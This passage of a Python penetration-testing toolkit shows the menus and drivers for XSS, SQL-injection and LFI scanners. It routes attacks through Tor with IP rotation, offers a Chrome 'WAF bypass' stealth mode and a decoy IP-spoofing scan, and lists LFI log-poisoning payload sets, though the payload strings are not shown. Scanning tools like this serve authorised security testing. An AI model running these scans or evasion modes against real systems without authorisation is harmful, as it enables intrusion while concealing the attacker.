        p = LFI_PAYLOADS["basic"] + LFI_PAYLOADS["bypass"] + LFI_PAYLOADS["wrapper"]
        return p, "Deep", len(p)
    elif mode == "insane":
        p = (LFI_PAYLOADS["basic"] + LFI_PAYLOADS["bypass"] +
             LFI_PAYLOADS["wrapper"] + LFI_PAYLOADS["log_poison"])
        return p, "Insane", len(p)
    else:
        p = LFI_PAYLOADS["basic"] + LFI_PAYLOADS["bypass"]
        return p, "Normal", len(p)


def run_xss_scanner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{Colors.CRIMSON}{Colors.BOLD}


 /$$   /$$  /$$$$$$$ /$$$$$$$        /$$$$$$$  /$$$$$$$  /$$$$$$  /$$$$$$$ 
|  $$ /$$/ /$$_____//$$_____/       /$$_____/ /$$_____/ |____  $$| $$__  $$
 \  $$$$/ |  $$$$$$|  $$$$$$       |  $$$$$$ | $$        /$$$$$$$| $$  \ $$
  >$$  $$  \____  $$\____  $$       \____  $$| $$       /$$__  $$| $$  | $$
 /$$/\  $$ /$$$$$$$//$$$$$$$/       /$$$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$
|__/  \__/|_______/|_______/       |_______/  \_______/ \_______/|__/  |__/

    {Colors.RESET}""")
    print(f"{Colors.YELLOW}  [!] For educational and authorized testing only{Colors.RESET}")
    print()
    if HAS_FAKER:
        print(f"{Colors.GREEN}[+] Faker loaded - random profiles enabled{Colors.RESET}")
    print()

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT SCAN MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Standard       {Colors.DIM}(requests, fast){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Stealth     {Colors.DIM}(Chrome, WAF bypass){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    scan_path = typed_input(Colors.AQUA + "[?] Choose (1-2): " + Colors.RESET).strip()

    if scan_path not in ["1", "2"]:
        print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
        return

    use_playwright = (scan_path == "2")

    if use_playwright and not HAS_PLAYWRIGHT:
        print(f"{Colors.RED}[!] Playwright not installed!{Colors.RESET}")
        print(f"{Colors.DIM_GRAY}[*] Install: pip install playwright{Colors.RESET}")
        return

    print()
    user_input = typed_input(Colors.AQUA + "[?] Enter target (domain or URL): " + Colors.RESET).strip()
    if not user_input:
        print(Colors.RED + "[!] No target entered" + Colors.RESET)
        return

    url = auto_build_url(user_input)
    if not url:
        print(Colors.RED + "[!] Invalid target" + Colors.RESET)
        return
    print(f"{Colors.GREEN}[+] Final URL: {url}{Colors.RESET}")

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT CONNECTION MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Direct")
    print(f"  {Colors.GREEN}2){Colors.RESET} Tor            {Colors.DIM}(anonymity, slow){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Custom Proxy")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    conn_choice = typed_input(Colors.AQUA + "[?] Choose (1-3): " + Colors.RESET).strip()

    proxies = None
    tor_rotation = False

    if conn_choice == "2":
        proxies = {"http": "socks5h://127.0.0.1:9050",
                   "https": "socks5h://127.0.0.1:9050"}
        if not verify_tor(proxies):
            print(f"{Colors.RED}[!] Tor proxy is not working. Make sure Tor is running on port 9050.{Colors.RESET}")
            return
        print(f"{Colors.GREEN}[+] Tor proxy configured{Colors.RESET}")
        if use_playwright:
            tor_choice = typed_input(
                Colors.AQUA + "[?] Rotate Tor IP every 10 requests? [y/n]: " + Colors.RESET).strip().lower()
            tor_rotation = tor_choice in ["y", "yes"]
            if tor_rotation:
                print(f"{Colors.GREEN}[+] Tor rotation enabled{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!] Note: Tor + requests = slow (~5-15s per request){Colors.RESET}")

    elif conn_choice == "3":
        proxy = typed_input(Colors.AQUA + "[?] Proxy (http://127.0.0.1:8080): " + Colors.RESET).strip()
        proxies = {"http": proxy, "https": proxy}
        print(f"{Colors.GREEN}[+] Proxy configured{Colors.RESET}")

    select_user_agent_mode()

    payloads, intensity_label, total_payloads = select_xss_payloads()
    if not payloads:
        print(f"{Colors.RED}[!] No payloads selected{Colors.RESET}")
        return

    print()
    dom_choice = typed_input(Colors.AQUA + "[?] Enable DOM-based analysis? [y/n]: " + Colors.RESET).strip().lower()
    dom_check = dom_choice in ["y", "yes"]
    if use_playwright:
        delay = 0.0
        print()
        print(f"{Colors.DIM_GRAY}[*] Stealth mode: auto delay (Chrome is slow){Colors.RESET}")
    else:
        print()
        print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
        print(f"{Colors.BOLD}  SELECT SCAN SPEED{Colors.RESET}")
        print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
        print(f"  {Colors.GREEN}1){Colors.RESET} Super Slow   {Colors.DIM}(1.0s delay){Colors.RESET}")
        print(f"  {Colors.GREEN}2){Colors.RESET} Slow         {Colors.DIM}(0.5s delay){Colors.RESET}")
        print(f"  {Colors.GREEN}3){Colors.RESET} Normal       {Colors.DIM}(0.2s delay){Colors.RESET}")
        print(f"  {Colors.GREEN}4){Colors.RESET} Fast         {Colors.DIM}(0.05s delay){Colors.RESET}")
        print(f"  {Colors.GREEN}5){Colors.RESET} Super Fast   {Colors.DIM}(no delay){Colors.RESET}")
        print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
        speed = typed_input(Colors.AQUA + "[?] Choose speed (1-5): " + Colors.RESET).strip()
        delay_settings = {"1": 1.0, "2": 0.5, "3": 0.2, "4": 0.05, "5": 0.0}
        delay = delay_settings.get(speed, 0.2)

    path_label = "Stealth (Chrome)" if use_playwright else "Standard (requests)"
    if conn_choice == "2":
        conn_label = "Tor"
    elif conn_choice == "3":
        conn_label = "Proxy"
    else:
        conn_label = "Direct"

    print()
    print(f"{Colors.FRAME}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}  SCAN CONFIGURATION{Colors.RESET}")
    print(f"{Colors.FRAME}{'=' * 60}{Colors.RESET}")
    print(f"  Target:       {url}")
    print(f"  Mode:         {path_label}")
    print(f"  Connection:   {conn_label}")
    if tor_rotation:
        print(f"  Tor Rotation: Yes (every 10 requests)")
    print(f"  Intensity:    {intensity_label}")
    print(f"  Payloads:     {total_payloads}")
    print(f"  DOM check:    {'Yes' if dom_check else 'No'}")
    print(f"  Delay:        {delay}s")
    print(f"{Colors.FRAME}{'=' * 60}{Colors.RESET}")
    print()

    confirm = typed_input(Colors.AQUA + "[?] Start scan? [Y/n]: " + Colors.RESET).strip().lower()
    if confirm == "n":
        print(f"{Colors.YELLOW}[!] Cancelled.{Colors.RESET}")
        return

    # ========== قدم ۹: اجرا ==========
    print(f"\n{Colors.GOLD}[*] Starting scan...{Colors.RESET}")
    print(f"{Colors.DIM_GRAY}[*] Mode: {path_label}{Colors.RESET}")
    print(f"{Colors.DIM_GRAY}[*] Payloads: {total_payloads}{Colors.RESET}")
    print()

    start_time = time.time()
    results = scan_xss_url(
        url, payloads, proxies,
        timeout=15 if use_playwright else 8,
        delay=delay,
        dom_check=dom_check,
        use_playwright=use_playwright,
        tor_rotation=tor_rotation
    )
    elapsed = time.time() - start_time

    # ========== قدم ۱۰: نتایج ==========
    print()
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}  SCAN COMPLETE{Colors.RESET}")
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"[+] Time: {elapsed:.2f}s")
    print(f"[+] Mode: {path_label}")
    print(f"[+] Intensity: {intensity_label}")
    print(f"[+] Vulnerable parameters: {len(results)}")

    if results:
        print()
        print(f"{Colors.RED}{Colors.BOLD}  [!] XSS VULNERABILITIES FOUND!{Colors.RESET}")
        print()
        for r in results:
            print(f"{Colors.YELLOW}[+] Parameter: {r['param']}{Colors.RESET}")
            for f in r["findings"]:
                sev_color = Colors.RED if f["severity"] == "HIGH" else Colors.YELLOW
                print(f"    {sev_color}[{f['type']}] [{f['severity']}]{Colors.RESET}")
                print(f"    {Colors.DIM_GRAY}Payload: {f['payload'][:80]}{Colors.RESET}")
                print(f"    {Colors.DIM_GRAY}Evidence: {f['evidence']}{Colors.RESET}")
                print()

        save = typed_input(f"\n{Colors.AQUA}[?] Save results? [y/n]: " + Colors.RESET).strip().lower()
        if save == "y":
            filename = f"xss_report_{int(time.time())}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 60 + "\n  XSS SCAN - RESULTS\n" + "=" * 60 + "\n\n")
                f.write(f"Target: {url}\nMode: {path_label}\nTime: {elapsed:.2f}s\n")
                f.write(f"Intensity: {intensity_label}\n")
                f.write(f"Vulnerable: {len(results)}\n\n")
                for r in results:
                    f.write("-" * 60 + f"\nParameter: {r['param']}\n" + "-" * 60 + "\n")
                    for finding in r["findings"]:
                        f.write(f"  Type: {finding['type']}\n")
                        f.write(f"  Severity: {finding['severity']}\n")
                        f.write(f"  Payload: {finding['payload']}\n")
                        f.write(f"  Evidence: {finding['evidence']}\n")
                        f.write(f"  URL: {finding['url']}\n\n")
            print(f"{Colors.GREEN}[+] Saved: {filename}{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}[+] No XSS found!{Colors.RESET}")
        print(f"{Colors.DIM_GRAY}[*] The target may be protected by WAF or properly sanitized.{Colors.RESET}")
    input(Colors.DIM_GRAY + "\n[Press Enter to return] " + Colors.RESET)


def run_sqli_scanner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{Colors.CRIMSON}{Colors.BOLD}
                        $$\                                              
                    $$ |                                             
 $$$$$$$\  $$$$$$\  $$ |       $$$$$$$\  $$$$$$$\ $$$$$$\  $$$$$$$\  
$$  _____|$$  __$$\ $$ |      $$  _____|$$  _____|\____$$\ $$  __$$\ 
\$$$$$$\  $$ /  $$ |$$ |      \$$$$$$\  $$ /      $$$$$$$ |$$ |  $$ |
 \____$$\ $$ |  $$ |$$ |       \____$$\ $$ |     $$  __$$ |$$ |  $$ |
$$$$$$$  |\$$$$$$$ |$$ |      $$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ |  $$ |
\_______/  \____$$ |\__|      \_______/  \_______|\_______|\__|  \__|
                $$ |                                                 
                $$ |                                                 
                \__|                                                 
    {Colors.RESET}""")
    if HAS_FAKER:
        print(f"{Colors.GREEN}[+] Faker loaded - random profiles enabled{Colors.RESET}")
    print()

    user_input = input(f"{Colors.AQUA}[?] Enter target (domain or URL): {Colors.RESET}").strip()
    if not user_input:
        print(Colors.RED + "[!] No target entered" + Colors.RESET)
        return

    url = auto_build_url(user_input)
    if not url:
        print(Colors.RED + "[!] Invalid target" + Colors.RESET)
        return
    print(f"{Colors.GREEN}[+] Final URL: {url}{Colors.RESET}")

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT CONNECTION MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Direct")
    print(f"  {Colors.GREEN}2){Colors.RESET} Tor")
    print(f"  {Colors.GREEN}3){Colors.RESET} Custom Proxy")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    conn_choice = input(f"{Colors.AQUA}[?] Choose (1-3): {Colors.RESET}").strip()

    proxies = None
    if conn_choice == "2":
        proxies = {"http": "socks5h://127.0.0.1:9050",
                   "https": "socks5h://127.0.0.1:9050"}
        if not verify_tor(proxies):
            print(f"{Colors.RED}[!] Tor proxy is not working. Make sure Tor is running on port 9050.{Colors.RESET}")
            return
        print(f"{Colors.GREEN}[+] Tor proxy configured for requests{Colors.RESET}")
    elif conn_choice == "3":
        proxy = input(f"{Colors.AQUA}[?] Proxy (http://127.0.0.1:8080): {Colors.RESET}").strip()
        proxies = {"http": proxy, "https": proxy}
    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT TEST MODES{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Error-Based only")
    print(f"  {Colors.GREEN}2){Colors.RESET} Error + Boolean")
    print(f"  {Colors.GREEN}3){Colors.RESET} All (Error + Boolean + Time)")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    test_mode = input(f"{Colors.AQUA}[?] Choose (1-3): {Colors.RESET}").strip()
    test_boolean = test_mode in ["2", "3"]
    test_time = test_mode == "3"

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT SCAN SPEED{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Super Slow   {Colors.DIM}(1.0s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Slow         {Colors.DIM}(0.5s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Normal       {Colors.DIM}(0.2s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}4){Colors.RESET} Fast         {Colors.DIM}(0.05s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}5){Colors.RESET} Super Fast   {Colors.DIM}(no delay){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    speed = input(f"{Colors.AQUA}[?] Choose speed (1-5): {Colors.RESET}").strip()
    delay_settings = {"1": 1.0, "2": 0.5, "3": 0.2, "4": 0.05, "5": 0.0}
    delay = delay_settings.get(speed, 0.2)

    print(f"\n{Colors.GOLD}[*] Starting scan...{Colors.RESET}")
    print(f"{Colors.DIM_GRAY}[*] Delay: {delay}s{Colors.RESET}")
    print(f"{Colors.DIM_GRAY}[*] Payloads: {len(ERROR_PAYLOADS)} error | "
          f"{len(BOOLEAN_PAYLOADS)} boolean | {len(TIME_PAYLOADS)} time{Colors.RESET}")

    start_time = time.time()
    results = scan_sqli_url(url, proxies, timeout=8, test_boolean=test_boolean,
                            test_time=test_time, delay=delay)
    elapsed = time.time() - start_time

    print()
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}  SCAN COMPLETE{Colors.RESET}")
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"[+] Time: {elapsed:.2f}s")
    print(f"[+] Vulnerable parameters: {len(results)}")

    if results:
        print()
        print(f"{Colors.RED}{Colors.BOLD}  [!] VULNERABILITIES FOUND!{Colors.RESET}")
        print()
        for r in results:
            print(f"{Colors.YELLOW}[+] Parameter: {r['param']}{Colors.RESET}")
            for f in r["findings"]:
                print(f"    {Colors.RED}[{f['type']}]{Colors.RESET}")
                print(f"    {Colors.DIM_GRAY}Payload: {f['payload']}{Colors.RESET}")
                print(f"    {Colors.DIM_GRAY}Evidence: {f['evidence']}{Colors.RESET}")
                print()

        save = input(f"\n{Colors.AQUA}[?] Save results? [y/n]: {Colors.RESET}").strip().lower()
        if save == "y":
            filename = f"sqli_report_{int(time.time())}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 60 + "\n  SQL INJECTION SCAN - RESULTS\n" + "=" * 60 + "\n\n")
                f.write(f"Target: {url}\nTime: {elapsed:.2f}s\nDelay: {delay}s\n")
                f.write(f"Vulnerable: {len(results)}\n\n")
                for r in results:
                    f.write("-" * 60 + f"\nParameter: {r['param']}\n" + "-" * 60 + "\n")
                    for finding in r["findings"]:
                        f.write(f"  Type: {finding['type']}\n")
                        f.write(f"  Payload: {finding['payload']}\n")
                        f.write(f"  Evidence: {finding['evidence']}\n")
                        f.write(f"  URL: {finding['url']}\n\n")
            print(f"{Colors.GREEN}[+] Saved: {filename}{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}[+] No SQL Injection found!{Colors.RESET}")
        print(f"{Colors.DIM_GRAY}[*] The target may be protected by WAF or properly secured.{Colors.RESET}")
    input(Colors.DIM_GRAY + "\n[Press Enter to return] " + Colors.RESET)


def scan_lfi_url(url, payloads, proxies=None, timeout=8, delay=0.2):
    print(f"\n{Colors.GOLD}[*] Target: {url}{Colors.RESET}")
    params = find_parameters(url)
    if not params:
        print(f"{Colors.RED}[!] No parameters found in URL{Colors.RESET}")
        return []

    print(f"{Colors.GREEN}[+] Found {len(params)} parameter(s): {', '.join(params)}{Colors.RESET}")

    all_results = []
    for param in params:
        print(f"\n{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Testing parameter: {Colors.YELLOW}{param}{Colors.RESET}")
        print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")

        findings = test_lfi_parameter(url, param, payloads, proxies, timeout, delay)
        if findings:
            all_results.append({"param": param, "findings": findings})
    return all_results


def run_lfi_scanner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{Colors.CRIMSON}{Colors.BOLD}
    $$\  $$$$$$\  $$\                                              
$$ |$$  __$$\ \__|                                             
$$ |$$ /  \__|$$\        $$$$$$$\  $$$$$$$\ $$$$$$\  $$$$$$$\  
$$ |$$$$\     $$ |      $$  _____|$$  _____|\____$$\ $$  __$$\ 
$$ |$$  _|    $$ |      \$$$$$$\  $$ /      $$$$$$$ |$$ |  $$ |
$$ |$$ |      $$ |       \____$$\ $$ |     $$  __$$ |$$ |  $$ |
$$ |$$ |      $$ |      $$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ |  $$ |
\__|\__|      \__|      \_______/  \_______|\_______|\__|  \__|



    {Colors.RESET}""")
    print(f"{Colors.YELLOW}  [!] For educational and authorized testing only{Colors.RESET}")
    print()

    user_input = typed_input(Colors.AQUA + "[?] Enter target (domain or URL): " + Colors.RESET).strip()
    if not user_input:
        print(Colors.RED + "[!] No target entered" + Colors.RESET)
        return

    url = auto_build_url(user_input)
    if not url:
        print(Colors.RED + "[!] Invalid target" + Colors.RESET)
        return
    print(f"{Colors.GREEN}[+] Final URL: {url}{Colors.RESET}")

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT CONNECTION MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Direct")
    print(f"  {Colors.GREEN}2){Colors.RESET} Tor")
    print(f"  {Colors.GREEN}3){Colors.RESET} Custom Proxy")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    conn_choice = typed_input(Colors.AQUA + "[?] Choose (1-3): " + Colors.RESET).strip()

    proxies = None
    if conn_choice == "2":
        proxies = {"http": "socks5h://127.0.0.1:9050",
                   "https": "socks5h://127.0.0.1:9050"}
        if not verify_tor(proxies):
            print(f"{Colors.RED}[!] Tor proxy is not working.{Colors.RESET}")
            return
        print(f"{Colors.GREEN}[+] Tor proxy configured{Colors.RESET}")
    elif conn_choice == "3":
        proxy = typed_input(Colors.AQUA + "[?] Proxy: " + Colors.RESET).strip()
        proxies = {"http": proxy, "https": proxy}

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT SCAN INTENSITY{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    quick_n = len(LFI_PAYLOADS["basic"])
    normal_n = quick_n + len(LFI_PAYLOADS["bypass"])
    deep_n = normal_n + len(LFI_PAYLOADS["wrapper"])
    insane_n = deep_n + len(LFI_PAYLOADS["log_poison"])
    print(f"  {Colors.GREEN}1){Colors.RESET} Quick      {Colors.DIM}({quick_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Normal     {Colors.DIM}({normal_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Deep       {Colors.DIM}({deep_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}4){Colors.RESET} Insane     {Colors.DIM}({insane_n} payloads){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    intensity = typed_input(Colors.AQUA + "[?] Choose (1-4): " + Colors.RESET).strip()
    mode_map = {"1": "quick", "2": "normal", "3": "deep", "4": "insane"}
    mode = mode_map.get(intensity, "normal")
    payloads, intensity_label, total_payloads = get_lfi_payloads(mode)

    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT SCAN SPEED{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Super Slow   {Colors.DIM}(1.0s){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Slow         {Colors.DIM}(0.5s){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Normal       {Colors.DIM}(0.2s){Colors.RESET}")
    print(f"  {Colors.GREEN}4){Colors.RESET} Fast         {Colors.DIM}(0.05s){Colors.RESET}")
    print(f"  {Colors.GREEN}5){Colors.RESET} Super Fast   {Colors.DIM}(0s){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    speed = typed_input(Colors.AQUA + "[?] Choose speed (1-5): " + Colors.RESET).strip()
    delay_settings = {"1": 1.0, "2": 0.5, "3": 0.2, "4": 0.05, "5": 0.0}
    delay = delay_settings.get(speed, 0.2)

    print()
    print(f"{Colors.FRAME}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}  SCAN CONFIGURATION{Colors.RESET}")
    print(f"{Colors.FRAME}{'=' * 60}{Colors.RESET}")
    print(f"  Target:     {url}")
    print(f"  Intensity:  {intensity_label} ({total_payloads} payloads)")
    print(f"  Delay:      {delay}s")
    print(f"  Connection: {'Tor' if conn_choice == '2' else ('Proxy' if conn_choice == '3' else 'Direct')}")
    print(f"{Colors.FRAME}{'=' * 60}{Colors.RESET}")
    print()

    confirm = typed_input(Colors.AQUA + "[?] Start scan? [Y/n]: " + Colors.RESET).strip().lower()
    if confirm == "n":
        print(f"{Colors.YELLOW}[!] Cancelled.{Colors.RESET}")
        return

    print(f"\n{Colors.GOLD}[*] Starting scan...{Colors.RESET}")
    start_time = time.time()
    results = scan_lfi_url(url, payloads, proxies, timeout=15, delay=delay)
    elapsed = time.time() - start_time

    print()
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}  SCAN COMPLETE{Colors.RESET}")
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"[+] Time: {elapsed:.2f}s")
    print(f"[+] Vulnerable parameters: {len(results)}")

    if results:
        print()
        print(f"{Colors.RED}{Colors.BOLD}  [!] LFI VULNERABILITIES FOUND!{Colors.RESET}")
        print()
        for r in results:
            print(f"{Colors.YELLOW}[+] Parameter: {r['param']}{Colors.RESET}")
            for f in r["findings"]:
                print(f"    {Colors.RED}[{f['type']}] [{f['severity']}] Category: {f['category']}{Colors.RESET}")
                print(f"    {Colors.DIM_GRAY}Payload: {f['payload'][:80]}{Colors.RESET}")
                print(f"    {Colors.DIM_GRAY}Evidence: {f['evidence']}{Colors.RESET}")
                print()

        save = typed_input(f"\n{Colors.AQUA}[?] Save results? [y/n]: " + Colors.RESET).strip().lower()
        if save == "y":
            filename = f"lfi_report_{int(time.time())}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 60 + "\n  LFI SCAN - RESULTS\n" + "=" * 60 + "\n\n")
                f.write(f"Target: {url}\nTime: {elapsed:.2f}s\n")
                f.write(f"Vulnerable: {len(results)}\n\n")
                for r in results:
                    f.write("-" * 60 + f"\nParameter: {r['param']}\n" + "-" * 60 + "\n")
                    for finding in r["findings"]:
                        f.write(f"  Type: {finding['type']}\n")
                        f.write(f"  Category: {finding['category']}\n")
                        f.write(f"  Payload: {finding['payload']}\n")
                        f.write(f"  Evidence: {finding['evidence']}\n")
                        f.write(f"  URL: {finding['url']}\n\n")
            print(f"{Colors.GREEN}[+] Saved: {filename}{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}[+] No LFI found!{Colors.RESET}")
        print(f"{Colors.DIM_GRAY}[*] The target may be protected or properly sanitized.{Colors.RESET}")

    input(Colors.DIM_GRAY + "\n[Press Enter to return] " + Colors.RESET)


def show_web_menu():
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        print(f"""{Colors.GREEN}{Colors.BOLD}
██╗    ██╗ ███████╗  ██████╗    ███████╗  ██████╗ █████╗  ███╗   ██╗
██║    ██║ ██╔════╝  ██╔══██╗   ██╔════╝ ██╔════╝██╔══██╗ ████╗  ██║
██║ █╗ ██║ █████╗    ██████╔╝   ███████╗ ██║     ███████║ ██╔██╗ ██║
██║███╗██║ ██╔══╝    ██╔══██╗   ╚════██║ ██║     ██╔══██║ ██║╚██╗██║
╚███╔███╔╝ ███████╗  ██████╔╝   ███████║ ╚██████╗██║  ██║ ██║ ╚████║
 ╚══╝╚══╝   ╚══════╝ ╚═════╝    ╚══════╝  ╚═════╝╚═╝  ╚═╝ ╚═╝  ╚═══╝
        {Colors.RESET}""")
        box_top()
        box_line("SELECT WEB TOOL", text_color=Colors.NEON_CYAN + Colors.BOLD)
        box_divider()
        box_line("1) Directory Buster", text_color=Colors.GREEN + Colors.BOLD)
        box_line("2) SQL Injection Scanner", text_color=Colors.GREEN + Colors.BOLD)
        box_line("3) XSS Scanner", text_color=Colors.GREEN + Colors.BOLD)
        box_line("4) LFI Scanner", text_color=Colors.GREEN + Colors.BOLD)
        box_line("5) Full Web Scan           [Coming Soon]", text_color=Colors.DIM_GRAY)
        box_line("6) Back to Main Menu", text_color=Colors.SKY_BLUE)
        box_bottom()

        choice = typed_input(Colors.AQUA + "[?] Choose (1-6): " + Colors.RESET).strip()
        if choice == "1":
            return "1"
        elif choice == "2":
            return "2"
        elif choice == "3":
            return "3"
        elif choice == "4":
            return "4"
        elif choice == "5":
            print()
            print(Colors.YELLOW + "+------------------------------------------------+" + Colors.RESET)
            print(Colors.YELLOW + "|  [!] This tool is not available yet.           |" + Colors.RESET)
            print(Colors.YELLOW + "+------------------------------------------------+" + Colors.RESET)
            print()
            input(Colors.DIM_GRAY + "[Press Enter to go back] " + Colors.RESET)
            continue
        elif choice in ("6", "0"):
            return "0"
        else:
            print(Colors.RED + "[!] Invalid option." + Colors.RESET)
            time.sleep(1)
            continue


def main():
    logging.basicConfig(
        level=logging.DEBUG,
        filename="scanner_debug.log",
        format="%(asctime)s [%(levelname)s] %(message)s"
    )
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        print(Colors.CRIMSON + """
 0-1-1-0-1-1-1-0-0-0-1-0-1-1-0-1-0-0-1-0-1
 0   ███████╗ ██████╗ █████╗ ███╗ 1 ██╗   1
 1   ██╔════╝██╔════╝██╔══██╗████╗1 ██║   0
 0   ███████╗██║0101 ███████║██╔██╗0██║   0
 1   ╚════██║██║0101 ██╔══██║██║╚██╗██║   1
 1   ███████║╚██████╗██║00██║██║0╚████║   1
 0   ╚═════╝ ╚═════╝╚ ═╝01 ╚═╝╚═╝1╚═══╝   0
  - - - - - - - - - - - - - - - - - - - -
""" + Colors.RESET)
        print()

        box_top()
        box_line("SELECT OPERATION", text_color=Colors.NEON_CYAN + Colors.BOLD)
        box_divider()
        box_line("1) Scan a target", text_color=Colors.SKY_BLUE)
        box_line("2) Monitor network traffic", text_color=Colors.SKY_BLUE)
        box_bottom()

        operation = typed_input(Colors.AQUA + "[?] Choose operation (1-2): " + Colors.RESET).strip()
        if operation == "2":
            monitor_banner()
            start_network_monitor()
            sys.exit(0)
        if operation != "1":
            print(Colors.RED + "[!] Invalid operation." + Colors.RESET)
            time.sleep(1)
            continue

        box_top()
        box_line("SELECT SCAN MODE", text_color=Colors.NEON_CYAN + Colors.BOLD)
        box_divider()
        box_line("1) Multi-Target Scan", text_color=Colors.SKY_BLUE)
        box_line("2) Single Target Scan", text_color=Colors.SKY_BLUE)
        box_line("3) Ping Sweep (Network)", text_color=Colors.SKY_BLUE)
        box_line("4) Subdomain Scanner", text_color=Colors.SKY_BLUE)
        box_line("5) OS Detection Only", text_color=Colors.SKY_BLUE)
        box_line("6) Tor Scan", text_color=Colors.SKY_BLUE)
        box_line("7) Decoy Scan (IP Spoofing)", text_color=Colors.SKY_BLUE)
        box_line("8) Web Scanning Tools", text_color=Colors.SKY_BLUE)
        box_line("9) OS Scanner", text_color=Colors.SKY_BLUE)
        box_line("10) Email Scanner", text_color=Colors.SKY_BLUE)
        box_line("11) proxy tester", text_color=Colors.SKY_BLUE)
        box_bottom()

        scan_mode = typed_input(Colors.AQUA + "[?] Choose mode (1-11): " + Colors.RESET).strip()

        if scan_mode not in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"]:
            print(Colors.RED + "[!] Invalid scan mode." + Colors.RESET)
            time.sleep(1)
            continue

        if scan_mode == "8":
            while True:
                web_mode = show_web_menu()
                if web_mode == "1":
                    run_directory_buster()
                elif web_mode == "2":
                    run_sqli_scanner()
                elif web_mode == "3":
                    run_xss_scanner()
                elif web_mode == "4":
                    run_lfi_scanner()
                elif web_mode == "0":
                    break
            continue

        if scan_mode == "9":
            if HAS_WINSCAN:
                win_scanner_menu()
            else:
                print(f"{Colors.RED}[!] scan_win.py not found or has errors{Colors.RESET}")
